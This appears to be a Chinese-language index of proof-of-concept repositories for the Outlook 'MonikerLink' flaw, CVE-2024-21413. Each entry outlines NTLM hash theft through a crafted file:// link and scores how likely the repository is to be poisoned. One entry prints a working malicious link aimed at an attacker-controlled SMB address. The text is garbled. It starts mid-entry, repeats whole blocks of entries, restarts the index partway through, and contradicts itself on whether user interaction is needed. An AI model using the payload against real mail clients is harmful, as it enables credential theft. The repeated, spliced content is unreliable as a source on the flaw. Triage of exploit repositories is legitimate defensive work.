PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

